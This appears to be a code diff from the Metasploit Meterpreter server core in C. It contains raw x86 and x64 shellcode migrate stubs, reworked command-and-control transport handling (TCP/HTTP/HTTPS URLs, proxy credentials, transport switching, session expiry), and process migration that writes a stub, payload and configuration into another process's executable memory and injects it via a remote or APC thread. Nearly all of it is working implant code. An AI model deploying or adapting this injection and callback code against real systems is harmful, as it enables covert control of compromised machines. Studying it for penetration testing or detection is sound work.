@@ -1,7 +1,8 @@
 #include "common.h"
 #include "base_inject.h"
+#include "../../../config.h"
 
-// see '/msf3/external/source/shellcode/windows/x86/src/migrate/migrate.asm'
+// see 'external/source/shellcode/windows/x86/src/migrate/migrate.asm'
 BYTE migrate_stub_x86[] =	"\xFC\x8B\x74\x24\x04\x81\xEC\x00\x20\x00\x00\xE8\x89\x00\x00\x00"
 							"\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B\x52\x0C\x8B\x52\x14\x8B"
 							"\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61\x7C\x02\x2C"
@@ -17,7 +18,7 @@ BYTE migrate_stub_x86[] =	"\xFC\x8B\x74\x24\x04\x81\xEC\x00\x20\x00\x00\xE8\x89\
 							"\x10\x53\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\xFF"
 							"\x36\x68\x1D\x9F\x26\x35\xFF\xD5\xFF\x56\x08";
 
-// see '/msf3/external/source/shellcode/windows/x64/src/migrate/migrate.asm'
+// see 'external/source/shellcode/windows/x64/src/migrate/migrate.asm'
 BYTE migrate_stub_x64[] =	"\xFC\x48\x89\xCE\x48\x81\xEC\x00\x20\x00\x00\x48\x83\xE4\xF0\xE8"
 							"\xC8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48"
 							"\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48"
@@ -51,7 +52,7 @@ typedef struct _MIGRATECONTEXT
 
 	union
 	{
- 		LPVOID lpPayload;
+ 		LPBYTE lpPayload;
 		BYTE bPadding2[8];
 	} p;
 
@@ -59,23 +60,26 @@ typedef struct _MIGRATECONTEXT
 
 } MIGRATECONTEXT, * LPMIGRATECONTEXT;
 
-BOOL remote_request_core_transport_change(Remote* remote, Packet* packet, DWORD* pResult)
+DWORD create_transport_from_request(Remote* remote, Packet* packet, Transport** transportBufer)
 {
 	DWORD result = ERROR_NOT_ENOUGH_MEMORY;
-	Packet* response = packet_create_response(packet);
-	UINT transportType = packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_TYPE);
+	Transport* transport = NULL;
 	wchar_t* transportUrl = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_URL);
 
-	TimeoutSettings timeouts;
-	timeouts.expiry = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
+	TimeoutSettings timeouts = { 0 };
+
+	int sessionExpiry = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
 	timeouts.comms = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);
 	timeouts.retry_total = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_TOTAL);
 	timeouts.retry_wait = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_WAIT);
 
-	if (timeouts.expiry == 0)
+	// special case, will still leave this in here even if it's not transport related
+	if (sessionExpiry != 0)
 	{
-		timeouts.expiry = remote->transport->timeouts.expiry;
+		remote->sess_expiry_time = sessionExpiry;
+		remote->sess_expiry_end = current_unix_timestamp() + remote->sess_expiry_time;
 	}
+
 	if (timeouts.comms == 0)
 	{
 		timeouts.comms = remote->transport->timeouts.comms;
@@ -89,55 +93,230 @@ BOOL remote_request_core_transport_change(Remote* remote, Packet* packet, DWORD*
 		timeouts.retry_wait = remote->transport->timeouts.retry_wait;
 	}
 
-	dprintf("[CHANGE TRANS] Type: %u", transportType);
 	dprintf("[CHANGE TRANS] Url: %S", transportUrl);
-	dprintf("[CHANGE TRANS] Expiration: %d", timeouts.expiry);
 	dprintf("[CHANGE TRANS] Comms: %d", timeouts.comms);
 	dprintf("[CHANGE TRANS] Retry Total: %u", timeouts.retry_total);
 	dprintf("[CHANGE TRANS] Retry Wait: %u", timeouts.retry_wait);
 
 	do
 	{
-		if (response == NULL || transportUrl == NULL)
+		if (transportUrl == NULL)
 		{
 			dprintf("[CHANGE TRANS] Something was NULL");
 			break;
 		}
 
-		if (transportType == METERPRETER_TRANSPORT_SSL)
+		if (wcsncmp(transportUrl, L"tcp", 3) == 0)
 		{
-			remote->next_transport = remote->trans_create_tcp(transportUrl, &timeouts);
+			MetsrvTransportTcp config = { 0 };
+			config.common.comms_timeout = timeouts.comms;
+			config.common.retry_total = timeouts.retry_total;
+			config.common.retry_wait = timeouts.retry_wait;
+			memcpy(config.common.url, transportUrl, sizeof(config.common.url));
+			transport = remote->trans_create(remote, &config.common, NULL);
 		}
 		else
 		{
-			BOOL ssl = transportType == METERPRETER_TRANSPORT_HTTPS;
+			BOOL ssl = wcsncmp(transportUrl, L"https", 5) == 0;
 			wchar_t* ua = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_UA);
-			wchar_t* proxy = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_INFO);
+			wchar_t* proxy = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_HOST);
 			wchar_t* proxyUser = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_USER);
 			wchar_t* proxyPass = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_PASS);
 			PBYTE certHash = packet_get_tlv_value_raw(packet, TLV_TYPE_TRANS_CERT_HASH);
 
-			remote->next_transport = remote->trans_create_http(ssl, transportUrl, ua, proxy,
-				proxyUser, proxyPass, certHash, &timeouts);
+			MetsrvTransportHttp config = { 0 };
+			config.common.comms_timeout = timeouts.comms;
+			config.common.retry_total = timeouts.retry_total;
+			config.common.retry_wait = timeouts.retry_wait;
+			wcsncpy(config.common.url, transportUrl, URL_SIZE);
 
-			SAFE_FREE(ua);
-			SAFE_FREE(proxy);
-			SAFE_FREE(proxyUser);
-			SAFE_FREE(proxyPass);
+			if (proxy)
+			{
+				wcsncpy(config.proxy.hostname, proxy, PROXY_HOST_SIZE);
+				free(proxy);
+			}
+
+			if (proxyUser)
+			{
+				wcsncpy(config.proxy.username, proxyUser, PROXY_USER_SIZE);
+				free(proxyUser);
+			}
+
+			if (proxyPass)
+			{
+				wcsncpy(config.proxy.password, proxyPass, PROXY_PASS_SIZE);
+				free(proxyPass);
+			}
+
+			if (ua)
+			{
+				wcsncpy(config.ua, ua, UA_SIZE);
+				free(ua);
+			}
+
+			if (certHash)
+			{
+				memcpy(config.ssl_cert_hash, certHash, CERT_HASH_SIZE);
+				// No need to free this up as it's not a wchar_t
+			}
+
+			transport = remote->trans_create(remote, &config.common, NULL);
 		}
 
 		// tell the server dispatch to exit, it should pick up the new transport
 		result = ERROR_SUCCESS;
 	} while (0);
 
-	if (packet)
+	*transportBufer = transport;
+
+	return result;
+}
+
+DWORD remote_request_core_transport_list(Remote* remote, Packet* packet)
+{
+	DWORD result = ERROR_SUCCESS;
+	Packet* response = NULL;
+
+	do
 	{
-		packet_transmit_empty_response(remote, response, result);
+		response = packet_create_response(packet);
+
+		if (!response)
+		{
+			result = ERROR_NOT_ENOUGH_MEMORY;
+			break;
+		}
+
+		// Add the session timeout to the top level
+		packet_add_tlv_uint(response, TLV_TYPE_TRANS_SESSION_EXP, remote->sess_expiry_end - current_unix_timestamp());
+
+		Transport* current = remote->transport;
+		Transport* first = remote->transport;
+
+		do
+		{
+			Packet* transportGroup = packet_create_group();
+
+			if (!transportGroup)
+			{
+				// bomb out, returning what we have so far.
+				break;
+			}
+
+			dprintf("[DISPATCH] Adding URL %S", current->url);
+			packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_URL, current->url);
+			dprintf("[DISPATCH] Adding Comms timeout %u", current->timeouts.comms);
+			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_COMM_TIMEOUT, current->timeouts.comms);
+			dprintf("[DISPATCH] Adding Retry total %u", current->timeouts.retry_total);
+			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_RETRY_TOTAL, current->timeouts.retry_total);
+			dprintf("[DISPATCH] Adding Retry wait %u", current->timeouts.retry_wait);
+			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_RETRY_WAIT, current->timeouts.retry_wait);
+
+			if (current->type != METERPRETER_TRANSPORT_SSL)
+			{
+				HttpTransportContext* ctx = (HttpTransportContext*)current->ctx;
+				dprintf("[DISPATCH] Transport is HTTP/S");
+				if (ctx->ua)
+				{
+					packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_UA, ctx->ua);
+				}
+				if (ctx->proxy)
+				{
+					packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_PROXY_HOST, ctx->proxy);
+				}
+				if (ctx->proxy_user)
+				{
+					packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_PROXY_USER, ctx->proxy_user);
+				}
+				if (ctx->proxy_pass)
+				{
+					packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_PROXY_PASS, ctx->proxy_pass);
+				}
+				if (ctx->cert_hash)
+				{
+					packet_add_tlv_raw(transportGroup, TLV_TYPE_TRANS_CERT_HASH, ctx->cert_hash, CERT_HASH_SIZE);
+				}
+			}
+
+			packet_add_group(response, TLV_TYPE_TRANS_GROUP, transportGroup);
+
+			current = current->next_transport;
+		} while (first != current);
+	} while (0);
+
+	if (response)
+	{
+		packet_transmit_response(result, remote, response);
 	}
 
-	SAFE_FREE(transportUrl);
+	return result;
+}
 
-	return result == ERROR_SUCCESS ? FALSE : TRUE;
+BOOL remote_request_core_transport_next(Remote* remote, Packet* packet, DWORD* result)
+{
+	dprintf("[DISPATCH] Asking to go to next transport (from 0x%p to 0x%p)", remote->transport, remote->transport->next_transport);
+	if (remote->transport == remote->transport->next_transport)
+	{
+		dprintf("[DISPATCH] Transports are the same, don't do anything");
+		// if we're switching to the same thing, don't bother.
+		*result = ERROR_INVALID_FUNCTION;
+	}
+	else
+	{
+		dprintf("[DISPATCH] Transports are different, perform the switch");
+		remote->next_transport = remote->transport->next_transport;
+		*result = ERROR_SUCCESS;
+	}
+
+	packet_transmit_empty_response(remote, packet, *result);
+	return *result == ERROR_SUCCESS ? FALSE : TRUE;
+
+}
+
+BOOL remote_request_core_transport_prev(Remote* remote, Packet* packet, DWORD* result)
+{
+	dprintf("[DISPATCH] Asking to go to previous transport (from 0x%p to 0x%p)", remote->transport, remote->transport->prev_transport);
+	if (remote->transport == remote->transport->prev_transport)
+	{
+		dprintf("[DISPATCH] Transports are the same, don't do anything");
+		// if we're switching to the same thing, don't bother.
+		*result = ERROR_INVALID_FUNCTION;
+	}
+	else
+	{
+		dprintf("[DISPATCH] Transports are different, perform the switch");
+		remote->next_transport = remote->transport->prev_transport;
+		*result = ERROR_SUCCESS;
+	}
+
+	packet_transmit_empty_response(remote, packet, *result);
+	return *result == ERROR_SUCCESS ? FALSE : TRUE;
+}
+
+DWORD remote_request_core_transport_add(Remote* remote, Packet* packet)
+{
+	Transport* transport = NULL;
+	DWORD result = create_transport_from_request(remote, packet, &transport);
+
+	packet_transmit_empty_response(remote, packet, result);
+	return result;
+}
+
+BOOL remote_request_core_transport_change(Remote* remote, Packet* packet, DWORD* result)
+{
+	Transport* transport = NULL;
+	*result = create_transport_from_request(remote, packet, &transport);
+
+	packet_transmit_empty_response(remote, packet, *result);
+
+	if (*result == ERROR_SUCCESS)
+	{
+		remote->next_transport = transport;
+		// exit out of the dispatch loop.
+		return FALSE;
+	}
+
+	return TRUE;
 }
 
 /*!
@@ -280,12 +459,15 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 	HANDLE hEvent = NULL;
 	BYTE * lpPayloadBuffer = NULL;
 	LPVOID lpMigrateStub = NULL;
-	LPVOID lpMemory = NULL;
+	LPBYTE lpMemory = NULL;
 	MIGRATECONTEXT ctx = { 0 };
 	DWORD dwMigrateStubLength = 0;
 	DWORD dwPayloadLength = 0;
 	DWORD dwProcessID = 0;
 	DWORD dwDestinationArch = 0;
+
+	MetsrvConfig* config = NULL;
+	DWORD configSize = 0;
 
 	do
 	{
@@ -336,10 +518,15 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 			BREAK_ON_ERROR("[MIGRATE] OpenProcess failed")
 		}
 
-		if (remote->transport->get_socket)
+		// get the existing configuration
+		dprintf("[MIGRATE] creating the configuration block");
+		remote->config_create(remote, &config, &configSize);
+		dprintf("[MIGRATE] Config of %u bytes stashed at 0x%p", configSize, config);
+
+		if (config->session.comms_fd)
 		{
 			// Duplicate the socket for the target process if we are SSL based
-			if (WSADuplicateSocket(remote->transport->get_socket(remote->transport), dwProcessID, &ctx.info) != NO_ERROR)
+			if (WSADuplicateSocket(config->session.comms_fd, dwProcessID, &ctx.info) != NO_ERROR)
 			{
 				BREAK_ON_WSAERROR("[MIGRATE] WSADuplicateSocket failed")
 			}
@@ -373,44 +560,55 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 		else
 		{
 			SetLastError(ERROR_BAD_ENVIRONMENT);
-			BREAK_ON_ERROR("[MIGRATE] Invalid target architecture")
+			dprintf("[MIGRATE] Invalid target architecture: %u", dwDestinationArch);
+			break;
 		}
 
-		// Allocate memory for the migrate stub, context and payload
-		lpMemory = VirtualAllocEx(hProcess, NULL, dwMigrateStubLength + sizeof(MIGRATECONTEXT)+dwPayloadLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		// Allocate memory for the migrate stub, context, payload and configuration block
+		lpMemory = (LPBYTE)VirtualAllocEx(hProcess, NULL, dwMigrateStubLength + sizeof(MIGRATECONTEXT) + dwPayloadLength + configSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 		if (!lpMemory)
 		{
 			BREAK_ON_ERROR("[MIGRATE] VirtualAllocEx failed")
 		}
 
 		// Calculate the address of the payload...
-		ctx.p.lpPayload = ((BYTE *)lpMemory + dwMigrateStubLength + sizeof(MIGRATECONTEXT));
+		ctx.p.lpPayload = lpMemory + dwMigrateStubLength + sizeof(MIGRATECONTEXT);
 
 		// Write the migrate stub to memory...
+		dprintf("[MIGRATE] Migrate stub: 0x%p -> %u bytes", lpMemory, dwMigrateStubLength);
 		if (!WriteProcessMemory(hProcess, lpMemory, lpMigrateStub, dwMigrateStubLength, NULL))
 		{
 			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 1 failed")
 		}
 
 		// Write the migrate context to memory...
-		if (!WriteProcessMemory(hProcess, ((BYTE *)lpMemory + dwMigrateStubLength), &ctx, sizeof(MIGRATECONTEXT), NULL))
+		dprintf("[MIGRATE] Migrate context: 0x%p -> %u bytes", lpMemory + dwMigrateStubLength, sizeof(MIGRATECONTEXT));
+		if (!WriteProcessMemory(hProcess, lpMemory + dwMigrateStubLength, &ctx, sizeof(MIGRATECONTEXT), NULL))
 		{
 			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 2 failed")
 		}
 
 		// Write the migrate payload to memory...
+		dprintf("[MIGRATE] Migrate payload: 0x%p -> %u bytes", ctx.p.lpPayload, dwPayloadLength);
 		if (!WriteProcessMemory(hProcess, ctx.p.lpPayload, lpPayloadBuffer, dwPayloadLength, NULL))
 		{
 			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 3 failed")
 		}
 
+		// finally write the configuration stub
+		dprintf("[MIGRATE] Configuration: 0x%p -> %u bytes", ctx.p.lpPayload + dwPayloadLength, configSize);
+		if (!WriteProcessMemory(hProcess, ctx.p.lpPayload + dwPayloadLength, config, configSize, NULL))
+		{
+			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 4 failed")
+		}
+
 		// First we try to migrate by directly creating a remote thread in the target process
-		if (inject_via_remotethread(remote, response, hProcess, dwDestinationArch, lpMemory, ((BYTE*)lpMemory + dwMigrateStubLength)) != ERROR_SUCCESS)
+		if (inject_via_remotethread(remote, response, hProcess, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS)
 		{
 			dprintf("[MIGRATE] inject_via_remotethread failed, trying inject_via_apcthread...");
 
 			// If that fails we can try to migrate via a queued APC in the target process
-			if (inject_via_apcthread(remote, response, hProcess, dwProcessID, dwDestinationArch, lpMemory, ((BYTE*)lpMemory + dwMigrateStubLength)) != ERROR_SUCCESS)
+			if (inject_via_apcthread(remote, response, hProcess, dwProcessID, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS)
 			{
 				BREAK_ON_ERROR("[MIGRATE] inject_via_apcthread failed")
 			}
@@ -420,20 +618,25 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 
 	} while (0);
 
+	SAFE_FREE(config);
+
 	// If we failed and have not sent the response, do so now
 	if (dwResult != ERROR_SUCCESS && response)
 	{
+		dprintf("[MIGRATE] Sending response");
 		packet_transmit_response(dwResult, remote, response);
 	}
 
 	// Cleanup...
 	if (hProcess)
 	{
+		dprintf("[MIGRATE] Closing the process handle 0x%08x", hProcess);
 		CloseHandle(hProcess);
 	}
 
 	if (hEvent)
 	{
+		dprintf("[MIGRATE] Closing the event handle 0x%08x", hEvent);
 		CloseHandle(hEvent);
 	}
 
@@ -443,6 +646,7 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 	}
 
 	// if migration succeeded, return 'FALSE' to indicate server thread termination.
+	dprintf("[MIGRATE] Finishing migration, result: %u", dwResult);
 	return ERROR_SUCCESS == dwResult ? FALSE : TRUE;
 }
 
@@ -452,9 +656,9 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
  * @param packet Pointer to the request packet.
  * @returns Indication of success or failure.
  * @remark If no values are given, no updates are made. The response to
-           this message is the new/current settings.
+ *         this message is the new/current settings.
  */
-DWORD remote_request_transport_set_timeouts(Remote * remote, Packet * packet)
+DWORD remote_request_core_transport_set_timeouts(Remote * remote, Packet * packet)
 {
 	DWORD result = ERROR_SUCCESS;
 	Packet* response = NULL;
@@ -479,8 +683,8 @@ DWORD remote_request_transport_set_timeouts(Remote * remote, Packet * packet)
 		if (expirationTimeout != 0)
 		{
 			dprintf("[DISPATCH TIMEOUT] setting expiration time to %d", expirationTimeout);
-			remote->transport->timeouts.expiry = expirationTimeout;
-			remote->transport->expiration_end = expirationTimeout + current_unix_timestamp();
+			remote->sess_expiry_time = expirationTimeout;
+			remote->sess_expiry_end = current_unix_timestamp() + expirationTimeout;
 		}
 
 		if (commsTimeout != 0)
@@ -503,7 +707,7 @@ DWORD remote_request_transport_set_timeouts(Remote * remote, Packet * packet)
 		}
 
 		// for the session expiry, return how many seconds are left before the session actually expires
-		packet_add_tlv_uint(response, TLV_TYPE_TRANS_SESSION_EXP, remote->transport->expiration_end - current_unix_timestamp());
+		packet_add_tlv_uint(response, TLV_TYPE_TRANS_SESSION_EXP, remote->sess_expiry_end - current_unix_timestamp());
 		packet_add_tlv_uint(response, TLV_TYPE_TRANS_COMM_TIMEOUT, remote->transport->timeouts.comms);
 		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_TOTAL, remote->transport->timeouts.retry_total);
 		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_WAIT, remote->transport->timeouts.retry_wait);
